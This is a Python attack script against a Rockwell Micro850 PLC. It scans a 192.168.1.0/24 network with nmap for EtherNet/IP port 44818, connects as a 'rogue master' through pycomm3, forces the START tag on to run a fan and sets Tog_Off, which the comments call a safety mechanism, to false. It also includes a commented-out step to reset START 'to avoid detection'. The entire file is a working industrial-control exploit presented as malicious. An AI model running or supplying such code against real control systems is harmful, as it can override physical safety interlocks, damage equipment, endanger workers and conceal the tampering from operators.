import nmap
import time
from pycomm3 import CIPDriver

# STEP 1: Discover the Rockwell Micro850 PLC
def find_plc():
    nm = nmap.PortScanner()
    
    print("[*] Scanning network to locate Rockwell Micro850 PLC...")
    
    # Modify this range based on the network configuration
    scan_range = "192.168.1.0/24"  
    
    # Scan for devices with EtherNet/IP (Port 44818 open)
    nm.scan(hosts=scan_range, arguments='-p 44818 --open -T4')
    
    for host in nm.all_hosts():
        if 'tcp' in nm[host] and 44818 in nm[host]['tcp'] and nm[host]['tcp'][44818]['state'] == 'open':
            print(f"[+] Possible Micro850 PLC found at {host}")
            return host
    
    print("[-] No Micro850 PLC found on the network.")
    return None

# STEP 2: Impersonate the Master & Manipulate PLC
def rogue_master(plc_ip):
    print(f"[*] Connecting to PLC at {plc_ip} as rogue master...")
    
    try:
        with CIPDriver(f"ethip://{plc_ip}") as plc:
            print("[+] Connection established.")

            # Read the current status of START and Tog_Off
            start_status = plc.read("START")
            tog_off_status = plc.read("Tog_Off")

            print(f"[*] START Status: {start_status}")
            print(f"[*] Tog_Off Status: {tog_off_status}")

            # Malicious action: Override START signal to continuously activate the fan
            print("[*] Overriding START signal to force system activation...")
            plc.write("START", True)

            # Disable safety mechanism -> Tog_Off
            print("[*] Disabling Tog_Off...")
            plc.write("Tog_Off", False)

            # Monitor the effect
            time.sleep(5)

            # Read new status
            start_status = plc.read("START")
            tog_off_status = plc.read("Tog_Off")

            print(f"[+] Post-attack START Status: {start_status}")
            print(f"[+] Post-attack Tog_Off Status: {tog_off_status}")

            # Optional: Set START back to avoid detection
            # plc.write("START", False)

    except Exception as e:
        print(f"[-] Error communicating with PLC: {e}")

# Main execution block
if __name__ == "__main__":
    plc_ip = find_plc()
    
    if plc_ip:
        rogue_master(plc_ip)
    else:
        print("[-] PLC not found. Exiting.")